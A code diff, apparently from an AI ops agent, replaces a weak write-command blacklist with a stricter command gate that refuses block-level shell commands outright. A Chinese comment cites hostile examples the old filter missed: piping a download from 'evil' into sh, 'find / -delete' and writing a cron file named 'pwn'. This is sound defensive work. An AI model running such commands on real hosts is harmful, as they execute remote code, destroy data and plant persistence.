@@ -86,6 +86,7 @@ import { preflightCheck } from '../../services/ssh/command-preflight'
 import { SftpManager } from '../../services/ssh/sftp'
 import { createCotTraceCollector } from './credibility/mass-functions/cot-trace-collector'
 import { assessRisk } from '../risk-engine'
+import { evaluateCommand, isStrictlyReadonly } from '../command-gate'
 import { withCallbackStreamTrace } from '../../services/observability/langfuse-trace'
 import { DatabaseManager } from '../../services/db/database'
 import { KnowledgeRepository } from '../../services/db/knowledge-repo'
@@ -562,21 +563,15 @@ class SupervisorAgent {
                   { command }: { command: string },
                   execOpts?: { toolCallId?: string },
                 ) => {
+                  // 判定权在命令闸（command-gate），不在这里：
+                  // 原先只有 assessRisk + 一条写动词黑名单，`curl http://evil|sh`、
+                  // `find / -delete`、`tee /etc/cron.d/pwn` 都不含那些动词，于是被当"只读"直接执行。
+                  const ro = isStrictlyReadonly(command)
                   const risk = assessRisk(command)
-                  if (risk.blocked || risk.level === 'CRITICAL' || risk.level === 'HIGH') {
+                  if (!ro.ok) {
                     return {
                       ok: false,
-                      error: `命令被风险引擎拦截（${risk.level}）：${risk.description}`,
-                      stdout: '',
-                      stderr: '',
-                      exitCode: -1,
-                    }
-                  }
-                  // 额外只读启发式：拒绝明显写操作
-                  if (/\b(rm|mv|cp|dd|mkfs|chmod|chown|userdel|shutdown|reboot|systemctl\s+(start|stop|restart|enable|disable)|apt\s+install|yum\s+install)\b/i.test(command)) {
-                    return {
-                      ok: false,
-                      error: 'ssh_readonly 仅允许只读查询，请使用演示模式 HITL 执行写操作',
+                      error: `ssh_readonly 拒绝执行：${ro.reason ?? '不是严格只读命令'}`,
                       stdout: '',
                       stderr: '',
                       exitCode: -1,
@@ -671,6 +666,13 @@ class SupervisorAgent {
                   // 被风险引擎硬拦截（fork 炸弹/rm -rf / 等）的命令连审批机会都没有
                   if (risk.blocked) {
                     return { ok: false, error: `命令被风险引擎硬拦截（${risk.level}）：${risk.description}`, exitCode: -1 }
+                  }
+                  // 命令闸是 block 的唯一权威：risk-engine 的 blocked 覆盖面比闸窄
+                  //（闸 2026-10-09 重写后新增的 shellPayloadExecution / protectedPathOverwrite
+                  // / findDeleteProtected 三类它完全不知道），所以两条都要过，block 不给审批入口。
+                  const gate = evaluateCommand(command)
+                  if (gate.level === 'block') {
+                    return { ok: false, error: `命令被风险闸拦截：${gate.reason}`, exitCode: -1 }
                   }
                   if (!approveWriteCommand) {
                     return { ok: false, error: '当前会话未启用写命令审批通道，写操作已拒绝（安全默认）', exitCode: -1 }
@@ -1664,11 +1666,14 @@ class SupervisorAgent {
       const stepIndex = graphState.stepIndex
       const command = currentPlan.steps[stepIndex] ?? ''
 
-      // 风险闸门（Hard Constraint 4）：HIGH/CRITICAL 需人工审批
+      // 风险闸门（Hard Constraint 4）：block 级无条件拒绝，HIGH/CRITICAL 需人工审批。
+      // block 判定权在 command-gate（唯一权威），risk-engine 只供审批卡片上的级别文案。
       const risk = assessRisk(command)
-      if (risk.level === 'HIGH' || risk.level === 'CRITICAL') {
+      const gate = evaluateCommand(command)
+      const blockedByGate = gate.level === 'block'
+      if (blockedByGate || risk.level === 'HIGH' || risk.level === 'CRITICAL') {
         let approved = false
-        if (options.approveRisk) {
+        if (!blockedByGate && options.approveRisk) {
           try {
             approved = await options.approveRisk(command, risk.level, risk.description)
           } catch {
@@ -1676,17 +1681,23 @@ class SupervisorAgent {
           }
         }
         if (!approved) {
+          const why = blockedByGate ? `风险闸拦截：${gate.reason}` : `风险等级 ${risk.level}，未获人工批准`
           const iteration: PaorIteration = {
             iteration: iterationNum,
             stepIndex,
-            act: { stepIndex, command, output: `命令被风控拦截（${risk.level}）：${risk.description}`, success: false },
-            observe: { status: 'failed', observations: [`风险等级 ${risk.level}，未获人工批准，跳过此步骤`], needsRetry: false },
+            act: {
+              stepIndex,
+              command,
+              output: blockedByGate ? `命令被风险闸拦截：${gate.reason}` : `命令被风控拦截（${risk.level}）：${risk.description}`,
+              success: false,
+            },
+            observe: { status: 'failed', observations: [`${why}，跳过此步骤`], needsRetry: false },
             reflect: { decision: 'continue', reasoning: '高危命令未获批准，跳过继续后续步骤' },
             riskBlocked: true
           }
           iterations.push(iteration)
           options.onIteration?.(iteration)
-          this.log.warn('[PAOR-Loop] 高危命令被拦截', { stepIndex, level: risk.level })
+          this.log.warn('[PAOR-Loop] 高危命令被拦截', { stepIndex, level: blockedByGate ? 'block' : risk.level })
           graphState = routeRiskRejected(graphState).state
           continue
         }
